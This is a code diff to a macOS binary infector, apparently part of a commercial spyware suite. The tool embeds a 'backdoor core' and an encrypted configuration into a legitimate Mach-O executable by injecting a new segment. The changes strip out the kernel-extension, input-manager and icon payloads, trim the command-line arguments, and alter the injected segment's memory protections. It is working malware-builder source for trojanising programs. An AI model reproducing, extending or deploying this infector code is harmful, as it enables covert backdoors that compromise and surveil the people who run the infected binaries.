@@ -46,7 +46,7 @@
 #include "RCSMacInfector.h"
 #include "RCSMacDropper.h"
 
-#define INJECTED_SEGMENT  "__INIT_STUBS"
+#define INJECTED_SEGMENT  "__CTOR_STUBS"
 //#define DEBUG
 //#define DEBUG_VERBOSE
 
@@ -250,11 +250,11 @@ int appendData (char *inputFilePointer,
 
 	char *coreFileName          = basename(coreFilePath);
 	char *confFileName          = basename(confFilePath);
-	char *kext32FileName        = basename(kext32FilePath);
-	char *kext64FileName        = basename(kext64FilePath);
-	char *inputManagerFileName  = basename(inputManagerFilePath);
+	//char *kext32FileName        = basename(kext32FilePath);
+	//char *kext64FileName        = basename(kext64FilePath);
+	//char *inputManagerFileName  = basename(inputManagerFilePath);
 	//char *XPCFileName           = basename(XPCFilePath);
-	char *iconFileName          = basename(iconFilePath);
+	//char *iconFileName          = basename(iconFilePath);
 	char *bitmapFileName		  = NULL;
 	if(strcmp(bitmapFilePath, "null"))
 		bitmapFileName		  = "infected.bmp";
@@ -445,6 +445,7 @@ int appendData (char *inputFilePointer,
 	tempFilePointer = NULL;
 #endif
 
+	/*
 	//
 	// KEXT32
 	//
@@ -548,11 +549,12 @@ int appendData (char *inputFilePointer,
 
 	tempFilePointer = NULL;
 #endif
-
+*/
+/*
 	//
 	// INPUT MANAGER
 	//
-	printf("[ii] InputManager %s\n", inputManagerFileName);
+	printf("[ii] InputManager %s, size: %d\n", inputManagerFileName, gInputManagerFileSize);
 	resource.type = RESOURCE_IN_MANAGER;
 	memset (resource.name, 0, sizeof (resource.name));
 	memcpy (resource.name, inputManagerFileName, min(sizeof (resource.name), strlen(inputManagerFileName)));
@@ -593,6 +595,7 @@ int appendData (char *inputFilePointer,
 #else
 	close (tempFD);
 #endif
+*/
 /*
 	//
 	// XPC service
@@ -640,6 +643,8 @@ int appendData (char *inputFilePointer,
 	close (tempFD);
 #endif
 */
+
+	/*
 	//
 	// ICON
 	//
@@ -687,7 +692,7 @@ int appendData (char *inputFilePointer,
 
 	tempFilePointer = NULL;
 #endif
-
+*/
 
 	if(bitmapFileName != NULL)
 	{
@@ -919,7 +924,7 @@ int infectSingleArch (char *inputFilePointer,
 					mySegment->fileoff  = inputFileSize + padding - outOffsetToArch;
 
 					mySegment->filesize = outputFileSize;
-					mySegment->maxprot  = 0x7;
+					mySegment->maxprot  = 0x3;
 					mySegment->initprot = 0x5;
 
 					segVMAddr = mySegment->vmaddr;
@@ -1443,17 +1448,17 @@ void
 usage(_mChar *aBinaryName)
 {
 #ifdef WIN32
-	printf("\nUsage: %S <core> <conf> <kext32> <kext64> <imanager> <xpc> <icon> <dirname> <bitmap> <input> <output>\n\n", aBinaryName);
+	printf("\nUsage: %S <core> <conf> <imanager> <xpc> <dirname> <bitmap> <input> <output>\n\n", aBinaryName);
 #else
 	printf("\nUsage: %s <core> <conf> <kext32> <kext64> <imanager> <xpc> <icon> <dirname> <input> <output>\n\n", aBinaryName);
 #endif
 	printf("\t<core>     : backdoor core\n");
 	printf("\t<conf>     : backdoor encrypted configuration\n");
-	printf("\t<kext32>   : kernel extension 32bit\n");
-	printf("\t<kext64>   : kernel extension 64bit\n");
+	//printf("\t<kext32>   : kernel extension 32bit\n");
+	//printf("\t<kext64>   : kernel extension 64bit\n");
 	printf("\t<imanager> : input manager\n");
 	printf("\t<xpc>      : xpc service\n");
-	printf("\t<icon>     : icon\n");
+	//printf("\t<icon>     : icon\n");
 	printf("\t<dirname>  : backdoor dir name\n");
 	printf("\t<bitmap>   : bitmap image for demo\n");
 	printf("\t<input>    : binary to melt with\n");
@@ -1463,7 +1468,7 @@ usage(_mChar *aBinaryName)
 int
 parseArguments(int argc, _mChar **argv)
 {
-	if (argc != 11)
+	if (argc != 7)
 	{
 		return kErrorGeneric;
 	}
@@ -1486,30 +1491,25 @@ parseArguments(int argc, _mChar **argv)
 
 	coreFilePath          = argv[1];
 	confFilePath          = argv[2];
-	kext32FilePath        = argv[3];
-	kext64FilePath        = argv[4];
-	inputManagerFilePath  = argv[5];
+	//kext32FilePath        = argv[3];
+	//kext64FilePath        = argv[4];
+	//inputManagerFilePath  = argv[3];
 //	XPCFilePath           = argv[6];
-	iconFilePath          = argv[6];
-	installPath           = argv[7];
-	bitmapFilePath		= argv[8];
-	inputFilePath         = argv[9];
-	outputFilePath        = argv[10];
+	//iconFilePath          = argv[6];
+	installPath           = argv[3];
+	bitmapFilePath		= argv[4];
+	inputFilePath         = argv[5];
+	outputFilePath        = argv[6];
 
-#ifdef DEBUG_VERBOSE
-	printf("coreFilePath: %s\n confFilePath: %s\n kext32FilePath: %s\n kext64FilePath: %s\n inputManagerFilePath: %s\n XPCFilePath: %s\n iconFilePath: %s\n installPath: %s\n bitmapFilePath: %s\n  inputFilePath: %s\n outputFilePath: %s\n",
+	printf("coreFilePath: %s\n confFilePath: %s\n installPath: %s\n bitmapFilePath: %s\n  inputFilePath: %s\n outputFilePath: %s\n",
 		coreFilePath,
 		confFilePath,
-		kext32FilePath,
-		kext64FilePath,
-		inputManagerFilePath,
-		XPCFilePath,
-		iconFilePath,
+		//inputManagerFilePath,		
 		installPath,
 		bitmapFilePath,
 		inputFilePath,
 		outputFilePath);
-#endif 
+
 
 	return kSuccess;
 }
@@ -1554,7 +1554,7 @@ main(int argc, _mChar *argv[])
 	int padding                 = 0;
 	int i                       = 0;
 	gNumStrings                 = 7;
-	gNumberOfResources          = 6;
+	gNumberOfResources          = 2;
 
 #ifdef WIN32
 	HANDLE inputFD, outputFD, inputFDMap, outputFDMap;
@@ -1596,7 +1596,7 @@ main(int argc, _mChar *argv[])
 #endif
 		exit (1);
 	}
-
+/*
 	if ((gKext32FileSize = getFileSize(kext32FilePath)) == kErrorGeneric)
 	{
 		printf ("[ee] KEXT32 file not found\n");
@@ -1614,7 +1614,8 @@ main(int argc, _mChar *argv[])
 #endif
 		exit (1);
 	}
-
+*/
+	/*
 	if ((gInputManagerFileSize = getFileSize(inputManagerFilePath)) == kErrorGeneric)
 	{
 		printf ("[ee] InputManager file not found\n");
@@ -1623,6 +1624,7 @@ main(int argc, _mChar *argv[])
 #endif
 		exit (1);
 	}
+	*/
 
 	/*
 	if ((gXPCFileSize = getFileSize(XPCFilePath)) == kErrorGeneric)
@@ -1634,7 +1636,7 @@ main(int argc, _mChar *argv[])
 		exit (1);
 	}
 	*/
-
+/*
 	if ((gIconFileSize = getFileSize(iconFilePath)) == kErrorGeneric)
 	{
 		printf ("[ee] Icon file not found\n");
@@ -1643,7 +1645,7 @@ main(int argc, _mChar *argv[])
 #endif
 		exit (1);
 	}
-
+*/
 	if(strcmp(bitmapFilePath, "null"))
 	{
 		if ((gBitmapFileSize = getFileSize(bitmapFilePath)) == kErrorGeneric)
@@ -1682,11 +1684,11 @@ main(int argc, _mChar *argv[])
 		+ sizeof (int)
 		+ gCoreFileSize
 		+ gConfFileSize
-		+ gKext32FileSize
-		+ gKext64FileSize
-		+ gInputManagerFileSize
+		//+ gKext32FileSize
+		//+ gKext64FileSize
+		//+ gInputManagerFileSize
 		//+ gXPCFileSize
-		+ gIconFileSize
+		//+ gIconFileSize
 		+ gBitmapFileSize
 		+ sizeof (infectionHeader)
 		+ sizeof (stringTable) * gNumStrings
